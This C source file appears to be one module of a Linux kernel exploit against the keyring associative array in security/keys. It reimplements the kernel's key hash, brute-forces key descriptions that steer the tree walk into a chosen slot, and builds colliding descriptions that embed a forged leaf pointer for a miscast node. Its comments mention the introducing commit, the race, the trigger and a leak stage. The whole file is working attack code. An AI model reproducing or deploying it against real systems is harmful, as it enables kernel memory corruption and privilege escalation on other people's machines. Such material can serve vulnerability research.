#include <errno.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "target_gen.h"

/*
 * key_hash() / hash_multiply() mirror security/keys/key.c.  They are stable
 * since 3cb989501c26 (the commit that introduced the bug) and are validated
 * at runtime by the order probe in leak.c, so a drift here is detected before
 * the trigger rather than blamed on the race.
 */
static uint64_t k2_mult_64x32_and_fold(uint64_t x, uint32_t y)
{
    uint64_t hi = (uint64_t)(uint32_t)(x >> 32) * y;
    uint64_t lo = (uint64_t)(uint32_t)x * y;

    return lo + ((uint64_t)(uint32_t)hi << 32) + (uint32_t)(hi >> 32);
}

uint64_t k2_key_hash(uint64_t type, uint64_t domain,
                     const unsigned char *description, size_t length,
                     bool keyring)
{
    uint64_t acc = k2_mult_64x32_and_fold(type, (uint32_t)length + 13U);

    acc = k2_mult_64x32_and_fold(acc, 9207U);
    acc = k2_mult_64x32_and_fold(acc, (uint32_t)domain);
    acc = k2_mult_64x32_and_fold(acc, 9207U);
    for (size_t off = 0; off < length; off += 4) {
        uint32_t piece = 0;
        size_t remaining = length - off;
        size_t bytes = remaining < sizeof(piece) ? remaining : sizeof(piece);

        memcpy(&piece, description + off, bytes);
        acc = k2_mult_64x32_and_fold(acc, piece);
        acc = k2_mult_64x32_and_fold(acc, 9207U);
    }
    if (!keyring && (acc & 0xfU) == 0)
        acc |= (acc >> 60) | 1U;
    else if (keyring && (acc & 0xfU) != 0)
        acc = (acc + (acc << 4)) & ~UINT64_C(0xf);
    return acc;
}

uint64_t k2_index_x(const char *description, size_t length)
{
    unsigned char packed[8] = {0};
    uint64_t value;

    packed[0] = (unsigned char)length;
    packed[1] = (unsigned char)(length >> 8);
    memcpy(packed + 2, description, 6);
    memcpy(&value, packed, sizeof(value));
    return value;
}

static bool k2_no_nul_u64(uint64_t value)
{
    for (unsigned int i = 0; i < 8; i++)
        if (((value >> (i * 8)) & 0xffU) == 0)
            return false;
    return true;
}

static void k2_generate_permutations_recursive(unsigned char out[120][5],
                                               unsigned char current[5],
                                               bool used[5],
                                               unsigned int depth,
                                               unsigned int *count)
{
    if (depth == 5) {
        memcpy(out[*count], current, 5);
        (*count)++;
        return;
    }
    for (unsigned int i = 0; i < 5; i++) {
        if (used[i])
            continue;
        used[i] = true;
        current[depth] = (unsigned char)i;
        k2_generate_permutations_recursive(out, current, used, depth + 1,
                                            count);
        used[i] = false;
    }
}

static void k2_generate_permutations(unsigned char out[120][5])
{
    unsigned char current[5] = {0};
    bool used[5] = {false};
    unsigned int count = 0;

    k2_generate_permutations_recursive(out, current, used, 0, &count);
    if (count != K2_PERMUTATIONS) {
        fprintf(stderr, "permutation generator produced %u\n", count);
        abort();
    }
}

static char *k2_format_target(char *buffer, uint32_t counter)
{
    /* 13 bytes: odd length, no NULs, cheap to exhaust. */
    snprintf(buffer, 16, "t%06x%06x", counter & 0xffffffU,
             (counter >> 24) & 0xffffffU);
    return buffer;
}

/*
 * Find one description whose hash is odd and whose bits 4..7 and 8..11 both
 * select the layout-derived node slot.  Bits 4..7 steer the walk in the
 * retained shortcut, bits 8..11 steer it in the chained one.
 */
static int k2_search_target(uint64_t type, uint64_t domain,
                            unsigned int slot, char out[K2_LONG_DESC_MAX],
                            size_t *length_out, uint64_t *hash_out)
{
    for (uint32_t counter = 0; counter < (1U << 24); counter++) {
        char candidate[16];
        uint64_t hash;

        k2_format_target(candidate, counter);
        hash = k2_key_hash(type, domain, (const unsigned char *)candidate,
                           K2_TARGET_LEN, false);
        if (!(hash & 1U) || ((hash >> 4) & 0xfU) != slot ||
            ((hash >> 8) & 0xfU) != slot)
            continue;
        memcpy(out, candidate, K2_TARGET_LEN + 1);
        *length_out = K2_TARGET_LEN;
        *hash_out = hash;
        return 0;
    }
    return -ENOENT;
}

static int k2_build_direct_collision(uint64_t type, uint64_t domain,
                                     uint64_t fake_leaf,
                                     uint64_t target_hash,
                                     unsigned int fake_slot,
                                     struct k2_collision_class *result)
{
    static const char alphabet[] = "ACEGIKMOQSUWYacegikmoqsuwy13579";
    static const unsigned char chunks[5][4] = {
        {'a', 'a', 'a', 'a'}, {'b', 'b', 'b', 'b'},
        {'c', 'c', 'c', 'c'}, {'d', 'd', 'd', 'd'},
        {'A', 'A', 'A', 'v'},
    };
    unsigned char permutations[K2_PERMUTATIONS][5];
    char descriptions[K2_PERMUTATIONS][K2_LONG_DESC_MAX];
    uint64_t hashes[K2_PERMUTATIONS];
    /* The retained shortcut skips four hash bits, so the chained shortcut,
     * when miscast as a node, is indexed with bits 4..7.  The skipped bits
     * live inline behind a 6 byte prologue, one slot per 8 bytes. */
    unsigned int base_offset = fake_slot >= 5 ? 6 + 8 * (fake_slot - 5) : 6;
    size_t chosen_offset = base_offset, prefix_length, description_length;
    unsigned int prefix_tests = 0;

    if (!(target_hash & 1U) || !k2_no_nul_u64(fake_leaf))
        return -EINVAL;
    prefix_length = (chosen_offset + 8 + 3) & ~(size_t)3;
    if (prefix_length < 40)
        prefix_length = 40;
    description_length = prefix_length + 21;
    if (description_length + 1 > K2_LONG_DESC_MAX)
        return -E2BIG;
    k2_generate_permutations(permutations);

    for (size_t ai = 0; ai < sizeof(alphabet) - 1; ai++) {
        for (size_t bi = 0; bi < 16; bi++) {
            unsigned char prefix[K2_LONG_DESC_MAX];

            prefix_tests++;
            memset(prefix, 'Q', prefix_length);
            prefix[0] = (unsigned char)alphabet[ai];
            prefix[1] = (unsigned char)alphabet[bi];
            for (unsigned int byte = 0; byte < 8; byte++)
                prefix[chosen_offset + byte] =
                    (unsigned char)(fake_leaf >> (56 - byte * 8));

            for (unsigned int p = 0; p < K2_PERMUTATIONS; p++) {
                size_t off = prefix_length;

                memcpy(descriptions[p], prefix, prefix_length);
                for (unsigned int c = 0; c < 5; c++) {
                    memcpy(descriptions[p] + off,
                           chunks[permutations[p][c]], 4);
                    off += 4;
                }
                descriptions[p][off++] = 'Q';
                descriptions[p][off] = 0;
                hashes[p] = k2_key_hash(type, domain,
                    (const unsigned char *)descriptions[p], off, false);
            }

            for (unsigned int p = 0; p < K2_PERMUTATIONS; p++) {
                unsigned int matches = 0;

                if ((hashes[p] & 0xffU) != (target_hash & 0xffU) ||
                    !(hashes[p] & 1U) || !(description_length & 1U))
                    continue;
                for (unsigned int q = 0; q < K2_PERMUTATIONS; q++)
                    matches += hashes[q] == hashes[p];
                if (matches < K2_COLLISION_KEYS)
                    continue;
                memset(result, 0, sizeof(*result));
                result->length = description_length;
                result->hash = hashes[p];
                result->fake_slot = fake_slot;
                result->tested_prefixes = prefix_tests;
                matches = 0;
                for (unsigned int q = 0;
                     q < K2_PERMUTATIONS && matches < K2_COLLISION_KEYS; q++) {
                    if (hashes[q] != hashes[p])
                        continue;
                    memcpy(result->descriptions[matches], descriptions[q],
                           description_length + 1);
                    matches++;
                }
                return 0;
            }
        }
    }
    return -ENOENT;
}

int k2_build_target(uint64_t type, uint64_t domain, uint64_t fake_leaf,
                    unsigned int fake_slot, struct k2_target_choice *choice)
{
    uint64_t target_hash;
    size_t length;
    int rc;

    if (!type || !domain || !choice)
        return -EINVAL;
    rc = k2_search_target(type, domain, fake_slot, choice->description,
                          &length, &target_hash);
    if (rc)
        return rc;
    choice->length = length;
    choice->hash = target_hash;
    /* The chained node holds the leaf tagged. */
    return k2_build_direct_collision(type, domain, fake_leaf | 1U,
                                     target_hash, fake_slot,
                                     &choice->collision);
}

int k2_find_outlier(uint64_t type, uint64_t domain, uint64_t class_hash,
                    char output[32], uint64_t *outlier_hash)
{
    for (uint32_t counter = 0; counter < (1U << 20); counter++) {
        int length = snprintf(output, 32, "z%08x", counter);
        uint64_t hash;

        if (length != 9)
            return -EIO;
        hash = k2_key_hash(type, domain, (const unsigned char *)output,
                           (size_t)length, false);
        if ((hash & 0xfU) == (class_hash & 0xfU) &&
            (hash & 0xffU) != (class_hash & 0xffU)) {
            *outlier_hash = hash;
            return 0;
        }
    }
    return -ENOENT;
}
